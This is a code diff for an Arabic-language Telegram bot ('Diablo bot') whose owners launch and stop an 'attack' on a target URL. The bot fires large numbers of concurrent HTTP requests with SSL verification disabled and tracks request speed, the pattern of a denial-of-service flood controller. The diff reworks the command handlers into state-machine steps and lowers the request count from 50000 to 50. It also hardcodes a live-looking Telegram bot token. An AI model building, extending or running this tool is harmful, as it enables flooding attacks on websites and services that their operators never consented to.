@@ -3,6 +3,9 @@ import asyncio
 import urllib3
 import logging
 from aiogram import Bot, Dispatcher, types
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.utils import executor
 
@@ -51,7 +54,7 @@ async def start_attack(url):
     stop_attack_event.clear()
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
         tasks = []
-        for _ in range(50000):
+        for _ in range(50):  # استخدام عدد أقل لتجنب المشاكل
             tasks.append(attack(url, session))
         
         await asyncio.gather(*tasks)
@@ -70,45 +73,56 @@ async def calculate_speed():
 
 TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # استبدل برمز التوكن الخاص بك
 bot = Bot(token=TOKEN)
-dp = Dispatcher(bot)
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
 
 def is_owner(user_id):
     return str(user_id) in Owner
+
+class Form(StatesGroup):
+    add_user = State()
+    remove_user = State()
+    start_attack = State()
 
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
     if is_owner(message.from_user.id):
         await message.reply("مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
-    else:
-        await message.reply("أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
-
-    if is_owner(message.from_user.id):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
         markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
         markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         await bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
-
-@dp.callback_query_handler(lambda call: True)
-async def callback_query(call: types.CallbackQuery):
-    if is_owner(call.from_user.id):
-        if call.data == "add_user":
-            msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
-            await dp.register_next_step_handler(msg, process_add_user)
-        elif call.data == "remove_user":
-            msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
-            await dp.register_next_step_handler(msg, process_remove_user)
-        elif call.data == "start_attack":
-            msg = await bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
-            await dp.register_next_step_handler(msg, process_start_attack)
-        elif call.data == "stop_attack":
-            stop_attack()
-            await bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
     else:
-        await bot.send_message(call.message.chat.id, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+        await message.reply("أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
 
-async def process_add_user(message: types.Message):
+@dp.callback_query_handler(lambda call: call.data == "add_user")
+async def callback_add_user(call: types.CallbackQuery):
+    if is_owner(call.from_user.id):
+        await Form.add_user.set()
+        await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
+
+@dp.callback_query_handler(lambda call: call.data == "remove_user")
+async def callback_remove_user(call: types.CallbackQuery):
+    if is_owner(call.from_user.id):
+        await Form.remove_user.set()
+        await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
+
+@dp.callback_query_handler(lambda call: call.data == "start_attack")
+async def callback_start_attack(call: types.CallbackQuery):
+    if is_owner(call.from_user.id):
+        await Form.start_attack.set()
+        await bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
+
+@dp.callback_query_handler(lambda call: call.data == "stop_attack")
+async def callback_stop_attack(call: types.CallbackQuery):
+    if is_owner(call.from_user.id):
+        stop_attack()
+        await bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
+
+@dp.message_handler(state=Form.add_user)
+async def process_add_user(message: types.Message, state: FSMContext):
     new_user = message.text.strip()
     if new_user not in NormalUsers:
         NormalUsers.append(new_user)
@@ -117,8 +131,10 @@ async def process_add_user(message: types.Message):
         await bot.send_message(message.chat.id, f"تمت إضافة المستخدم: {new_user}")
     else:
         await bot.send_message(message.chat.id, "المستخدم موجود بالفعل في القائمة.")
+    await state.finish()
 
-async def process_remove_user(message: types.Message):
+@dp.message_handler(state=Form.remove_user)
+async def process_remove_user(message: types.Message, state: FSMContext):
     user_to_remove = message.text.strip()
     if user_to_remove in NormalUsers:
         NormalUsers.remove(user_to_remove)
@@ -128,8 +144,10 @@ async def process_remove_user(message: types.Message):
         await bot.send_message(message.chat.id, f"تمت إزالة المستخدم: {user_to_remove}")
     else:
         await bot.send_message(message.chat.id, "المستخدم غير موجود في القائمة.")
+    await state.finish()
 
-async def process_start_attack(message: types.Message):
+@dp.message_handler(state=Form.start_attack)
+async def process_start_attack(message: types.Message, state: FSMContext):
     url = message.text.strip()
     if url:
         await bot.send_message(message.chat.id, f"بدء الهجوم على: {url}")
@@ -140,6 +158,7 @@ async def process_start_attack(message: types.Message):
         await asyncio.gather(speed_task, attack_task)
     else:
         await bot.send_message(message.chat.id, "لم يتم إدخال رابط الهدف بشكل صحيح.")
+    await state.finish()
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
